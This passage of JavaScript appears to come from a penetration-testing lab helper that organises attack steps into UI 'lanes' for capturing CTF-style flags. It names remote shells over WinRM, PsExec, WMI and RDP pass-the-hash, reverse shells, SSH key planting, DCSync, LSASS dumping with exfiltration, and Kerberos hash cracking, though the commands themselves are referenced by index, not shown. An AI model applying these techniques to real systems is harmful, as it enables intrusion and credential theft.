                  doneWhen: function () { return localFlagCaptured; }
                }
              ]
            }
          ]
        },
        {
          id: 'onhost',
          icon: 'host',
          label: 'Get On Host & Capture Proof',
          lanes: [
            {
              id: 'winrm-shell',
              label: 'Connect over WinRM (Evil-WinRM)',
              portLabel: 'Port 5985',
              doneWhen: function () { return localFlagOnHost; },
              lockedWhen: function () { return !winrmOpen; },
              lockBadge: 'Port 5985 Closed',
              lockReason: hasAdmin ? 'Port 5985 is currently closed. Pick "Enable WinRM -> Connect" to open it remotely!' : 'Port 5985 is closed and enabling WinRM remotely requires Local Administrator rights.',
              steps: [
                {
                  title: 'Connect Interactive WinRM Shell',
                  sub: 'Opens an interactive Evil-WinRM PowerShell session on the target.',
                  cmdIndex: useNtHash ? 1 : 0,
                  ignoreSettled: true,
                  doneWhen: function () { return hasFact('winrm.authenticated') && hasWinShell; }
                },
                {
                  title: 'Locate User Flag Path in Shell',
                  sub: 'Finds the exact path to user.txt across user Desktops.',
                  cmdIndex: 9,
                  doneWhen: function () { return localPathKnown; }
                },
                {
                  title: 'Capture On-Host Proof (whoami + ipconfig + user.txt)',
                  sub: 'Run inside Evil-WinRM and paste back (or screenshot) for your report.',
                  cmdIndex: 11,
                  doneWhen: function () { return localFlagOnHost; }
                }
              ]
            },
            {
              id: 'enable-winrm-shell',
              label: 'Enable WinRM -> Connect Evil-WinRM',
              portLabel: '445 -> 5985',
              doneWhen: function () { return localFlagOnHost; },
              lockedWhen: function () { return !hasAdmin && !winrmOpen; },
              lockBadge: 'Needs Admin',
              lockReason: 'Enabling WinRM and firewall rules remotely over SMB requires Local Administrator rights.',
              steps: [
                {
                  title: 'Enable WinRM & Firewall Rule Remotely',
                  sub: 'Adds your user to Remote Management Users and opens WinRM (5985).',
                  cmdIndex: 6,
                  ignoreSettled: true,
                  alreadyOpenWhen: function () { return winrmOpen && !hasFact('host.winrm_enabled'); },
                  alreadyOpenBadge: 'Port 5985 Open',
                  doneWhen: function () { return hasFact('host.winrm_enabled'); }
                },
                {
                  title: 'Connect over WinRM (Evil-WinRM)',
                  sub: 'Log into your newly enabled WinRM session.',
                  cmdIndex: useNtHash ? 1 : 0,
                  ignoreSettled: true,
                  doneWhen: function () { return hasFact('winrm.authenticated') && hasWinShell; }
                },
                {
                  title: 'Capture On-Host Proof (whoami + ipconfig + user.txt)',
                  sub: 'Prints identity, IP configuration, and user.txt in one frame.',
                  cmdIndex: 11,
                  doneWhen: function () { return localFlagOnHost; }
                }
              ]
            },
            {
              id: 'enable-rdp-shell',
              label: 'Enable RDP -> Connect over RDP',
              portLabel: '445 -> 3389',
              doneWhen: function () { return localFlagOnHost; },
              lockedWhen: function () { return !hasAdmin && !rdpOpen; },
              lockBadge: rdpOpen ? 'Ready' : 'Port 3389 Closed (Needs Admin)',
              lockReason: 'Port 3389 (RDP) is closed and enabling RDP via registry/firewall requires Local Administrator rights.',
              steps: [
                {
                  title: 'Enable RDP, Group Access & Firewall Remotely',
                  sub: 'Adds your user to Remote Desktop Users, enables TermService, and opens port 3389.',
                  cmdIndex: 6,
                  ignoreSettled: true,
                  alreadyOpenWhen: function () { return rdpOpen && !hasFact('host.rdp_enabled'); },
                  alreadyOpenBadge: 'Port 3389 Open',
                  doneWhen: function () { return hasFact('host.rdp_enabled'); }
                },
                {
                  title: 'Connect over RDP (xfreerdp)',
                  sub: 'Launches an interactive RDP desktop session on the target.',
                  cmdIndex: 2,
                  ignoreSettled: true,
                  doneWhen: function () { return hasFact('rdp.authenticated'); }
                },
                {
                  title: 'Capture On-Host Proof Inside RDP Command Prompt',
                  sub: 'Run inside cmd.exe on the RDP desktop to print identity, IP, and user.txt.',
                  cmdIndex: 10,
                  doneWhen: function () { return localFlagOnHost; }
                }
              ]
            },
            {
              id: 'wmi-psexec-shell',
              label: 'WMI / PsExec Interactive Shell',
              portLabel: 'Ports 135 / 445 · Admin',
              doneWhen: function () { return localFlagOnHost; },
              lockedWhen: function () { return !hasAdmin; },
              lockBadge: 'Needs Admin',
              lockReason: 'impacket-wmiexec and impacket-psexec require Local Administrator privileges on the target.',
              steps: [
                {
                  title: 'Connect via WMI Semi-Interactive Shell',
                  sub: 'Spawns a C:\\> prompt over WMI/SMB (works even when WinRM 5985 and RDP 3389 are closed).',
                  cmdIndex: 3,
                  ignoreSettled: true,
                  doneWhen: function () { return hasWinShell; }
                },
                {
                  title: 'Locate User Flag Across Desktops',
                  sub: 'Finds the exact user.txt path in under 1 second.',
                  cmdIndex: 8,
                  doneWhen: function () { return localPathKnown; }
                },
                {
                  title: 'Capture On-Host Proof (whoami + hostname + ipconfig + user.txt)',
                  sub: 'Run inside your C:\\> shell and paste the output back.',
                  cmdIndex: 10,
                  doneWhen: function () { return localFlagOnHost; }
                }
              ]
            }
          ]
        }
      ];
    } else if (id === 'flag-hunt-root-windows') {
      launcherSub = 'Choose how to get on host (WMI, PsExec, Enable RDP, or Enable WinRM) or dump the flag remotely.';
      if (needsBothFlagsOnHost) {
        callout = {
          kind: 'highlight',
          title: localFlagRemoteOnly
            ? 'User Flag Was Grabbed Remotely - Capture Both User + Root Flags On-Host!'
            : 'Capture Both User + Root Flags On-Host in One Shot!',
          body: localFlagRemoteOnly
            ? 'Because user.txt was read remotely over SMB without an interactive shell, Step 3 in every "Get On Host" path below automatically captures BOTH user.txt and root.txt alongside whoami, hostname, and ipconfig in one exam-ready frame.'
            : 'Neither flag has been captured on-host yet. Step 3 in every "Get On Host" path below automatically captures BOTH user.txt and root.txt alongside whoami, hostname, and ipconfig in one command.'
        };
      }
      var onHostProofCmdIdx = needsBothFlagsOnHost
        ? ((localPathKnown && rootPathKnown) ? 25 : 22)
        : (rootPathKnown ? 24 : 22);
      var onHostPsProofCmdIdx = needsBothFlagsOnHost
        ? ((localPathKnown && rootPathKnown) ? 25 : 22)
        : (rootPathKnown ? 26 : 22);
      var onHostProofTitle = needsBothFlagsOnHost
        ? 'Capture Both User + Root Flags On-Host (whoami + ipconfig + Both Flags)'
        : 'Capture On-Host Root Proof (whoami + hostname + ipconfig + root.txt)';
      var onHostProofSub = needsBothFlagsOnHost
        ? 'Prints whoami, hostname, ipconfig, user.txt, and root.txt together in one terminal frame.'
        : 'Prints whoami, hostname, ipconfig, and root.txt together in one terminal frame.';

      rawGroups = [
        {
          id: 'onhost',
          icon: 'host',
          label: 'Get On Host & Capture Proof (Recommended)',
          lanes: [
            {
              id: 'psexec-shell',
              label: 'PsExec SYSTEM Shell (impacket-psexec)',
              portLabel: 'Port 445',
              doneWhen: function () { return rootFlagOnHost && (!needsBothFlagsOnHost || localFlagOnHost); },
              steps: [
                {
                  title: 'Connect via PsExec Interactive SYSTEM Shell',
                  sub: 'Opens a full interactive NT AUTHORITY\\SYSTEM cmd.exe pipe over SMB port 445.',
                  cmdIndex: useDaHash ? 16 : 15,
                  ignoreSettled: true,
                  doneWhen: function () { return hasFact('access.system') && hasWinShell; }
                },
                {
                  title: 'Locate User & Root Flag Paths Across Desktops',
                  sub: 'Sweeps C:\\Users\\*\\Desktop for user.txt and root.txt in under 1 second.',
                  cmdIndex: 21,
                  doneWhen: function () { return rootPathKnown && (!needsBothFlagsOnHost || localPathKnown); }
                },
                {
                  title: onHostProofTitle,
                  sub: onHostProofSub,
                  cmdIndex: onHostProofCmdIdx,
                  doneWhen: function () { return rootFlagOnHost; }
                }
              ]
            },
            {
              id: 'wmi-shell',
              label: 'WMI Shell (impacket-wmiexec)',
              portLabel: 'Ports 135 / 445',
              doneWhen: function () { return rootFlagOnHost && (!needsBothFlagsOnHost || localFlagOnHost); },
              steps: [
                {
                  title: 'Connect via WMI Semi-Interactive Shell',
                  sub: 'Spawns a semi-interactive C:\\> prompt over WMI/SMB (works when WinRM 5985 & RDP 3389 are closed).',
                  cmdIndex: useDaHash ? 14 : 13,
                  ignoreSettled: true,
                  doneWhen: function () { return hasWinShell; }
                },
                {
                  title: 'Locate User & Root Flag Paths Across Desktops',
                  sub: 'Sweeps C:\\Users\\*\\Desktop for user.txt and root.txt in under 1 second.',
                  cmdIndex: 21,
                  doneWhen: function () { return rootPathKnown && (!needsBothFlagsOnHost || localPathKnown); }
                },
                {
                  title: onHostProofTitle,
                  sub: onHostProofSub,
                  cmdIndex: onHostProofCmdIdx,
                  doneWhen: function () { return rootFlagOnHost; }
                }
              ]
            },
            {
              id: 'enable-rdp',
              label: 'Enable RDP -> Connect over RDP',
              portLabel: '445 -> 3389',
              doneWhen: function () { return rootFlagOnHost && (!needsBothFlagsOnHost || localFlagOnHost); },
              steps: [
                {
                  title: 'Enable RDP, Group Access & Firewall Rule Remotely',
                  sub: 'Enables Terminal Services, opens firewall port 3389, and adds your user to Remote Desktop Users.',
                  cmdIndex: useDaHash ? 19 : 18,
                  ignoreSettled: true,
                  alreadyOpenWhen: function () { return rdpOpen && !hasFact('host.rdp_enabled'); },
                  alreadyOpenBadge: 'Port 3389 Open',
                  doneWhen: function () { return hasFact('host.rdp_enabled'); }
                },
                {
                  title: 'Connect over RDP with FreeRDP (xfreerdp)',
                  sub: 'Launches an interactive Administrator RDP desktop session (supports Pass-the-Hash via /pth).',
                  cmdIndex: 12,
                  ignoreSettled: true,
                  doneWhen: function () { return hasFact('rdp.authenticated'); }
                },
                {
                  title: onHostProofTitle,
                  sub: 'Run inside cmd.exe on the RDP desktop and paste the output (or screenshot) back.',
                  cmdIndex: onHostProofCmdIdx,
                  doneWhen: function () { return rootFlagOnHost; }
                }
              ]
            },
            {
              id: 'enable-winrm',
              label: 'Enable WinRM -> Connect over WinRM',
              portLabel: '445 -> 5985',
              doneWhen: function () { return rootFlagOnHost && (!needsBothFlagsOnHost || localFlagOnHost); },
              steps: [
                {
                  title: 'Enable WinRM & Firewall Rule Remotely',
                  sub: 'Runs winrm quickconfig -q and opens port 5985 on the Windows firewall.',
                  cmdIndex: useDaHash ? 19 : 18,
                  ignoreSettled: true,
                  alreadyOpenWhen: function () { return winrmOpen && !hasFact('host.winrm_enabled'); },
                  alreadyOpenBadge: 'Port 5985 Open',
                  doneWhen: function () { return hasFact('host.winrm_enabled'); }
                },
                {
                  title: 'Connect over WinRM with Evil-WinRM',
                  sub: 'Opens an interactive PowerShell session over port 5985.',
                  cmdIndex: useDaHash ? 11 : 10,
                  ignoreSettled: true,
                  doneWhen: function () { return hasFact('winrm.authenticated'); }
                },
                {
                  title: onHostProofTitle,
                  sub: onHostProofSub,
                  cmdIndex: onHostPsProofCmdIdx,
                  doneWhen: function () { return rootFlagOnHost; }
                }
              ]
            }
          ]
        },
        {
          id: 'remote',
          icon: 'zap',
          label: 'Remote Flag Grab (From Kali)',
          lanes: [
            {
              id: 'remote-smb',
              label: 'Search & Dump via SMB',
              portLabel: 'Port 445',
              doneWhen: function () { return rootFlagCaptured; },
              steps: [
                {
                  title: 'Search Flag Remotely over SMB',
                  sub: 'Sweeps all user profile Desktops for root.txt / proof.txt over SMB.',
                  cmdIndex: useDaHash ? 0 : 4,
                  doneWhen: function () { return rootPathKnown; }
                },
                {
                  title: 'Dump Flag Remotely over SMB',
                  sub: 'Reads the located root flag directly over SMB from Kali.',
                  cmdIndex: useDaHash ? 5 : 8,
                  doneWhen: function () { return rootFlagCaptured; }
                }
              ]
            },
            {
              id: 'remote-wmi',
              label: 'Search & Dump via WMI',
              portLabel: 'Port 135',
              doneWhen: function () { return rootFlagCaptured; },
              steps: [
                {
                  title: 'Search Flag Remotely over WMI',
                  sub: 'Sweeps user Desktops for root.txt / proof.txt over WMI without creating an SMB service.',
                  cmdIndex: useDaHash ? 2 : 3,
                  doneWhen: function () { return rootPathKnown; }
                },
                {
                  title: 'Dump Flag Remotely over WMI',
                  sub: 'Reads the located root flag over WMI.',
                  cmdIndex: useDaHash ? 9 : 7,
                  doneWhen: function () { return rootFlagCaptured; }
                }
              ]
            },
            {
              id: 'remote-winrm',
              label: 'Search & Dump via WinRM',
              portLabel: 'Port 5985',
              doneWhen: function () { return rootFlagCaptured; },
              lockedWhen: function () { return !winrmOpen; },
              lockBadge: 'Port 5985 Closed',
              lockReason: 'Port 5985 (WinRM) is closed unless enabled first. Use SMB or WMI above, or Enable WinRM in Get On Host.',
              steps: [
                {
                  title: 'Search Flag Remotely over WinRM',
                  sub: 'Searches C:\\Users for root.txt over WinRM.',
                  cmdIndex: 1,
                  doneWhen: function () { return rootPathKnown; }
                },
                {
                  title: 'Dump Flag Remotely over WinRM',
                  sub: 'Reads the located root flag over WinRM.',
                  cmdIndex: 6,
                  doneWhen: function () { return rootFlagCaptured; }
                }
              ]
            }
          ]
        }
      ];
    } else if (id === 'flag-hunt-linux' || id === 'flag-hunt-root-linux') {
      var isRootLin = id === 'flag-hunt-root-linux';
      var linFlagDone = isRootLin ? rootFlagCaptured : localFlagCaptured;
      var linPathDone = isRootLin ? rootPathKnown : localPathKnown;
      if (isRootLin && needsBothFlagsOnHost) {
        callout = {
          kind: 'highlight',
          title: 'Capture Both User + Root Flags On-Host',
          body: 'Step 2 below can print both user.txt and root.txt alongside whoami, id, hostname, and ip addr in one frame.'
        };
      }
      rawGroups = [
        {
          id: 'onhost',
          icon: 'host',
          label: 'Get On Host & Capture Proof',
          lanes: [
            {
              id: 'in-shell-lin',
              label: 'Already in Shell · Locate & Proof',
              portLabel: 'Interactive Shell',
              doneWhen: function () { return linFlagDone; },
              steps: [
                {
                  title: 'One-Shot Find & Print Flag with Host Identity',
                  sub: 'Finds flag files across the filesystem and prints them alongside whoami, id, hostname, and IP.',
                  cmdIndex: 3,
                  doneWhen: function () { return linFlagDone || linPathDone; }
                },
                {
                  title: (isRootLin && needsBothFlagsOnHost && localPathKnown)
                    ? 'Capture Both User + Root Flags with Identity'
                    : 'Capture Clean Proof Frame (whoami + id + ip + cat flag)',
                  sub: 'Prints a clean proof frame for your report screenshot.',
                  cmdIndex: isRootLin ? ((needsBothFlagsOnHost && localPathKnown) ? 5 : 4) : 5,
                  doneWhen: function () { return linFlagDone; }
                }
              ]
            },
            {
              id: 'ssh-shell-lin',
              label: 'Connect via SSH -> Capture Proof',
              portLabel: 'Port 22',
              doneWhen: function () { return linFlagDone; },
              lockedWhen: function () { return !sshOpen; },
              lockBadge: 'Port 22 Closed',
              steps: [
                {
                  title: 'Connect Interactive SSH Session',
                  sub: 'Logs in directly over SSH port 22.',
                  cmdIndex: 0,
                  ignoreSettled: true,
                  doneWhen: function () { return hasLinShell && hasFact('ssh.authenticated'); }
                },
                {
                  title: 'Locate & Print Flag with Host Identity',
                  sub: 'Run inside your SSH session and paste the output back.',
                  cmdIndex: 3,
                  doneWhen: function () { return linFlagDone; }
                }
              ]
            },
            {
              id: 'upgrade-shell-lin',
              label: 'Authorize SSH Key / Reverse Shell',
              portLabel: 'Upgrade',
              doneWhen: function () { return linFlagDone; },
              steps: [
                {
                  title: 'Plant SSH Public Key in authorized_keys',
                  sub: 'Authorizes your Kali SSH key so you can log in with a full PTY over SSH.',
                  cmdIndex: 1,
                  ignoreSettled: true
                },
                {
                  title: 'Or Trigger Bash Reverse Shell to Listener',
                  sub: 'Sends an interactive bash shell to your Kali listener.',
                  cmdIndex: 2,
                  ignoreSettled: true
                },
                {
                  title: 'Capture On-Host Proof Inside Shell',
                  sub: 'Prints whoami, id, hostname, IP, and the flag.',
                  cmdIndex: 3,
                  doneWhen: function () { return linFlagDone; }
                }
              ]
            }
          ]
        },
        {
          id: 'remote',
          icon: 'zap',
          label: 'Remote SSH Grab (From Kali)',
          lanes: [
            {
              id: 'remote-ssh-lin',
              label: 'Locate & Read Remotely over SSH',
              portLabel: 'Port 22',
              doneWhen: function () { return linFlagDone; },
              lockedWhen: function () { return !sshOpen; },
              lockBadge: 'Port 22 Closed',
              steps: [
                {
                  title: 'Locate Flag Path Remotely over SSH',
                  sub: 'Searches for the flag file over SSH from Kali.',
                  cmdIndex: isRootLin ? 6 : 4,
                  doneWhen: function () { return linPathDone; }
                },
                {
                  title: 'Read Proof Remotely over SSH (nxc ssh -x)',
                  sub: 'Runs id, hostname, ip addr, and cat over SSH.',
                  cmdIndex: isRootLin ? 7 : 6,
                  doneWhen: function () { return linFlagDone; }
                }
              ]
            }
          ]
        }
      ];
    } else if (id === 'win-interactive-shell') {
      launcherSub = 'Select how you want to land an interactive session on the Windows host.';
      rawGroups = [
        {
          id: 'all',
          icon: 'terminal',
          label: 'Interactive Shell Transports',
          lanes: [
            {
              id: 'wmi-shell',
              label: 'WMI Shell (impacket-wmiexec)',
              portLabel: 'Ports 135 / 445',
              doneWhen: function () { return hasWinShell; },
              lockedWhen: function () { return !hasAdmin; },
              lockBadge: 'Needs Admin',
              steps: [
                {
                  title: 'Spawn Semi-Interactive WMI Shell',
                  sub: 'Reliable C:\\> prompt over WMI/SMB when WinRM (5985) and RDP (3389) are closed.',
                  cmdIndex: 3,
                  doneWhen: function () { return hasWinShell; }
                }
              ]
            },
            {
              id: 'psexec-shell',
              label: 'PsExec / SMBExec SYSTEM Shell',
              portLabel: 'Port 445',
              doneWhen: function () { return hasFact('access.system'); },
              lockedWhen: function () { return !hasAdmin; },
              lockBadge: 'Needs Admin',
              steps: [
                {
                  title: 'Spawn Direct SYSTEM Shell (impacket-psexec)',
                  sub: 'Creates a service over SMB 445 and drops into NT AUTHORITY\\SYSTEM.',
                  cmdIndex: 4,
                  doneWhen: function () { return hasFact('access.system'); }
                },
                {
                  title: 'Alternative: Stealthier SMBExec Shell',
                  sub: 'Spawns a SYSTEM shell over SMB without dropping a service binary.',
                  cmdIndex: 5,
                  doneWhen: function () { return hasFact('access.system'); }
                }
              ]
            },
            {
              id: 'enable-winrm',
              label: 'Enable & Connect WinRM (Evil-WinRM)',
              portLabel: 'Port 5985',
              doneWhen: function () { return hasFact('winrm.authenticated'); },
              lockedWhen: function () { return !hasAdmin && !winrmOpen; },
              lockBadge: 'Port 5985 Closed',
              steps: [
                {
                  title: 'Enable WinRM & Remote Management Group Remotely',
                  sub: 'Opens port 5985 and adds your account to Remote Management Users.',
                  cmdIndex: 6,
                  ignoreSettled: true,
                  alreadyOpenWhen: function () { return winrmOpen && !hasFact('host.winrm_enabled'); },
                  alreadyOpenBadge: 'Port 5985 Open',
                  doneWhen: function () { return hasFact('host.winrm_enabled'); }
                },
                {
                  title: 'Connect Interactive PowerShell (Evil-WinRM)',
                  sub: 'Full interactive PowerShell remoting session.',
                  cmdIndex: useNtHash ? 1 : 0,
                  doneWhen: function () { return hasFact('winrm.authenticated'); }
                }
              ]
            },
            {
              id: 'enable-rdp',
              label: 'Enable & Connect RDP (xfreerdp)',
              portLabel: 'Port 3389',
              doneWhen: function () { return hasFact('rdp.authenticated'); },
              lockedWhen: function () { return !hasAdmin && !rdpOpen; },
              lockBadge: 'Port 3389 Closed',
              steps: [
                {
                  title: 'Enable RDP & Remote Desktop Users Group Remotely',
                  sub: 'Enables Terminal Services, opens port 3389, and grants group access.',
                  cmdIndex: 6,
                  ignoreSettled: true,
                  alreadyOpenWhen: function () { return rdpOpen && !hasFact('host.rdp_enabled'); },
                  alreadyOpenBadge: 'Port 3389 Open',
                  doneWhen: function () { return hasFact('host.rdp_enabled'); }
                },
                {
                  title: 'Launch Interactive RDP Desktop (xfreerdp)',
                  sub: 'Connects to the remote Windows desktop (supports Pass-the-Hash via /pth).',
                  cmdIndex: 2,
                  doneWhen: function () { return hasFact('rdp.authenticated'); }
                }
              ]
            }
          ]
        }
      ];
    } else if (id === 'fix-no-tty') {
      launcherSub = 'Upgrade your dumb reverse/web shell into an interactive PTY so sudo, su, and ssh work.';
      rawGroups = [
        {
          id: 'all',
          icon: 'terminal',
          label: 'PTY Shell Upgrade',
          lanes: [
            {
              id: 'python-pty',
              label: 'Python3 PTY Upgrade + Raw Terminal Stabilization',
              portLabel: '2-Step Sequence',
              doneWhen: function () { return hasFact('advice.tty'); },
              steps: [
                {
                  title: 'Spawn Interactive PTY on Target',
                  sub: 'Allocates a pseudo-terminal inside your current shell (or use script -qc /bin/bash /dev/null).',
                  cmdIndex: 0
                },
                {
                  title: 'Stabilize Terminal (Raw Mode + Foreground + TERM)',
                  sub: 'Background with Ctrl-Z, set Kali terminal to raw mode, and restore tab-completion & Ctrl-C safety.',
                  cmdIndex: 1
                }
              ]
            }
          ]
        }
      ];
    } else if (id === 'lateral-exec' || id === 'own-domain-pth') {
      var isPthMove = id === 'own-domain-pth';
      launcherSub = 'Choose between one-shot remote command execution or spawning an interactive shell.';
      rawGroups = [
        {
          id: 'all',
          icon: 'zap',
          label: 'Execution & Shell Options',
          lanes: isPthMove ? [
            {
              id: 'pth-oneshot',
              label: 'Validate & Run Command (nxc smb)',
              portLabel: 'Port 445',
              steps: [
                { title: 'Confirm Domain Admin (Pwn3d!)', sub: 'Validates the dumped Administrator hash over SMB.', cmdIndex: 0 },
                { title: 'Execute Remote Command via SMB', sub: 'Runs a command as Administrator without spawning a full shell.', cmdIndex: 1 }
              ]
            },
            {
              id: 'pth-psexec',
              label: 'Interactive SYSTEM Shell (PsExec)',
              portLabel: 'Port 445',
              steps: [
                { title: 'Spawn SYSTEM Shell via Pass-the-Hash', sub: 'Opens an interactive shell using impacket-psexec.', cmdIndex: 2 }
              ]
            },
            {
              id: 'pth-winrm',
              label: 'Interactive WinRM Shell (Evil-WinRM)',
              portLabel: 'Port 5985',
              lockedWhen: function () { return !winrmOpen; },
              lockBadge: 'Port 5985 Closed',
              steps: [
                { title: 'Connect Evil-WinRM with NT Hash', sub: 'Opens an interactive PowerShell session over port 5985.', cmdIndex: 3 }
              ]
            }
          ] : [
            {
              id: 'lat-smb-exec',
              label: 'One-Shot Remote Command (nxc)',
              portLabel: 'Ports 445 / 135',
              steps: [
                { title: 'Validate Admin Access (Pwn3d!)', sub: 'Confirms local admin rights on the target.', cmdIndex: 0 },
                { title: 'Execute Command over SMB/WMI', sub: 'Runs your command remotely without logging in interactively.', cmdIndex: 1 }
              ]
            },
            {
              id: 'lat-wmiexec',
              label: 'WMI Interactive Shell (impacket-wmiexec)',
              portLabel: 'Ports 135 / 445',
              steps: [
                { title: 'Spawn Semi-Interactive WMI Shell', sub: 'Stealthier C:\\> shell without creating a Windows service.', cmdIndex: 10 }
              ]
            },
            {
              id: 'lat-psexec',
              label: 'PsExec SYSTEM Shell (impacket-psexec)',
              portLabel: 'Port 445',
              steps: [
                { title: 'Spawn Service-Based SYSTEM Shell', sub: 'Drops into NT AUTHORITY\\SYSTEM over SMB.', cmdIndex: useNtHash ? 9 : 8 }
              ]
            },
            {
              id: 'lat-winrm',
              label: 'WinRM Interactive Shell (Evil-WinRM)',
              portLabel: 'Port 5985',
              lockedWhen: function () { return !winrmOpen; },
              lockBadge: 'Port 5985 Closed',
              steps: [
                { title: 'Connect Interactive Evil-WinRM Session', sub: 'Full PowerShell session when port 5985 is open.', cmdIndex: 7 }
              ]
            }
          ]
        }
      ];
    } else if (id === 'dcsync' || id === 'dump-secrets' || id === 'lsass-dump-onbox') {
      launcherSub = 'Select your preferred credential extraction method based on your privileges and OPSEC needs.';
      if (id === 'dcsync') {
        rawGroups = [
          {
            id: 'all',
            icon: 'key',
            label: 'DCSync Replication Methods',
            lanes: [
              {
                id: 'dcsync-impacket',
                label: 'impacket-secretsdump (Recommended)',
                portLabel: 'Works for ACL & Admin',
                doneWhen: function () { return hasFact('loot.ntds') || hasFact('hash.krbtgt'); },
                steps: [
                  { title: 'Full Domain DRSUAPI Sync (-just-dc)', sub: 'Replicates all domain NTLM hashes without requiring ADMIN$ share access.', cmdIndex: 1 },
                  { title: 'Or Target Single Account (-just-dc-user)', sub: 'Faster, quieter replication of just the Administrator account.', cmdIndex: 2 }
                ]
              },
              {
                id: 'dcsync-nxc',
                label: 'NetExec --ntds',
                portLabel: 'Requires Local Admin',
                doneWhen: function () { return hasFact('loot.ntds') || hasFact('hash.krbtgt'); },
                steps: [
                  { title: 'Dump NTDS.dit via NetExec SMB', sub: 'One-liner DRSUAPI dump when your account holds Local Admin (Pwn3d!).', cmdIndex: 0 }
                ]
              },
              {
                id: 'dcsync-mimikatz',
                label: 'On-Host Mimikatz lsadump::dcsync',
                portLabel: 'In-Session',
                doneWhen: function () { return hasFact('loot.ntds') || hasFact('hash.krbtgt'); },
                steps: [
                  { title: 'Run lsadump::dcsync Inside Windows Session', sub: 'Replicates the Administrator hash from an on-host shell running as the rights-holder.', cmdIndex: 3 }
                ]
              }
            ]
          }
        ];
      } else if (id === 'dump-secrets') {
        rawGroups = [
          {
            id: 'all',
            icon: 'key',
            label: 'Credential Harvesting Lanes',
            lanes: [
              {
                id: 'dump-sam-lsa',
                label: 'Remote SAM + LSA Secrets',
                portLabel: 'Port 445',
                steps: [
                  { title: 'Dump Local SAM & LSA via NetExec', sub: 'Extracts local account hashes and service passwords over SMB.', cmdIndex: 0 },
                  { title: 'Full Remote Dump via impacket-secretsdump', sub: 'Dumps SAM, LSA, and cached domain logon hashes in one pass.', cmdIndex: 7 }
                ]
              },
              {
                id: 'dump-lsassy',
                label: 'Remote LSASS Memory (lsassy)',
                portLabel: 'Port 445',
                steps: [
                  { title: 'Extract Active Logon Sessions Remotely (-M lsassy)', sub: 'Dumps LSASS memory remotely over SMB and parses logon credentials without touching mimikatz on disk.', cmdIndex: 2 }
                ]
              },
              {
                id: 'dump-ntds-dc',
                label: 'Domain Controller NTDS Dump',
                portLabel: 'DRSUAPI',
                steps: [
                  { title: 'Dump Full Domain NTDS via NetExec', sub: 'Replicates all domain hashes on a Domain Controller.', cmdIndex: 1 },
                  { title: 'Or Extract Single Administrator Hash', sub: 'Targets only the Administrator account via secretsdump.', cmdIndex: 9 }
                ]
              },
              {
                id: 'dump-onhost-mimi',
                label: 'On-Host Mimikatz (Interactive)',
                portLabel: 'In-Session',
                steps: [
                  { title: 'Enable SeDebugPrivilege', sub: 'Required before reading LSASS memory inside mimikatz.', cmdIndex: 5 },
                  { title: 'Extract Logon Passwords & Hashes', sub: 'Reads active session credentials from LSASS.', cmdIndex: 6 }
                ]
              }
            ]
          }
        ];
      } else {
        rawGroups = [
          {
            id: 'all',
            icon: 'key',
            label: 'On-Box LSASS Dump Lanes',
            lanes: [
              {
                id: 'lsass-comsvcs',
                label: 'Built-In LOLBin (comsvcs.dll -> pypykatz)',
                portLabel: 'No Upload Needed',
                steps: [
                  { title: 'Get LSASS Process ID', sub: 'Finds the PID of lsass.exe required by MiniDump.', cmdIndex: 0 },
                  { title: 'Dump LSASS Memory with comsvcs.dll', sub: 'Uses native rundll32 comsvcs.dll MiniDump to write lsass.dmp.', cmdIndex: 1 },
                  { title: 'Parse Dump Offline on Kali with pypykatz', sub: 'Extracts NTLM hashes, Kerberos tickets, and cleartext passwords.', cmdIndex: 4 }
                ]
              },
              {
                id: 'lsass-procdump',
                label: 'Sysinternals ProcDump -> SMB Exfil',
                portLabel: 'AV Bypass Fallback',
                steps: [
                  { title: 'Dump LSASS with procdump.exe', sub: 'Creates lsass.dmp using signed Sysinternals binary.', cmdIndex: 2 },
                  { title: 'Start SMB Server on Kali to Catch Dump', sub: 'Exfiltrate lsass.dmp over SMB.', cmdIndex: 3 },
                  { title: 'Parse Dump Offline with pypykatz', sub: 'Extracts all logon sessions on Kali.', cmdIndex: 4 }
                ]
              }
            ]
          }
        ];
      }
    } else if (category === 'hash-cracking') {
      launcherSub = 'Pick your preferred cracking engine (Hashcat GPU/CPU vs. John the Ripper auto-format).';
      if (id === 'crack-tgs' || id === 'crack-kerberoast') {
        var isAdTgs = id === 'crack-tgs';
        rawGroups = [
          {
            id: 'all',
            icon: 'key',
            label: 'Cracking Engine & Ticket Type',
            lanes: [
              {
                id: 'tgs-hashcat-rc4',
                label: 'Hashcat RC4-HMAC (-m 13100)',
                portLabel: 'Standard TGS',
                steps: isAdTgs ? [
                  { title: 'Crack Kerberoast Ticket with Hashcat (-m 13100)', sub: 'Standard RC4-HMAC TGS ticket cracking with rockyou.', cmdIndex: 0 },
                  { title: 'Display Cracked Plaintext (--show)', sub: 'Prints already-cracked user:password pairs from the potfile.', cmdIndex: 1 }
                ] : [
                  { title: 'Crack Kerberoast Ticket with Hashcat (-m 13100)', sub: 'Standard RC4-HMAC TGS ticket cracking.', cmdIndex: 0 }
                ]
              },
              {
                id: 'tgs-john',
                label: 'John the Ripper (Zero-Guesswork)',
                portLabel: 'Auto-Detects Format',
                steps: [
                  { title: 'Crack Ticket with John the Ripper', sub: 'Automatically detects $krb5tgs$ etype without needing mode numbers.', cmdIndex: isAdTgs ? 2 : 1 }
                ]
              },
              {
                id: 'tgs-hashcat-aes',
                label: 'Hashcat AES-128 / AES-256',
                portLabel: '-m 19600 / 19700',
                steps: isAdTgs ? [
                  { title: 'Crack AES-128 Ticket (-m 19600)', sub: 'Use when ticket header starts with $krb5tgs$17$.', cmdIndex: 3 },
                  { title: 'Crack AES-256 Ticket (-m 19700)', sub: 'Use when ticket header starts with $krb5tgs$18$.', cmdIndex: 4 }
                ] : [
                  { title: 'Crack AES-256 Ticket (-m 19700)', sub: 'Use when ticket header starts with $krb5tgs$18$.', cmdIndex: 2 },
                  { title: 'Crack AES-128 Ticket (-m 19600)', sub: 'Use when ticket header starts with $krb5tgs$17$.', cmdIndex: 3 }
                ]
              }
            ]
          }
        ];
      } else if (id === 'crack-asrep' || id === 'crack-asrep-offline') {
        var isAdAsrep = id === 'crack-asrep';
        rawGroups = [
          {
            id: 'all',
            icon: 'key',
            label: 'Cracking Engine',
            lanes: [
              {
                id: 'asrep-hashcat',
                label: 'Hashcat AS-REP (-m 18200)',
                portLabel: 'Fastest',
                steps: isAdAsrep ? [
                  { title: 'Crack AS-REP Hash with Hashcat (-m 18200)', sub: 'Cracks $krb5asrep$ hashes against your wordlist.', cmdIndex: 0 },
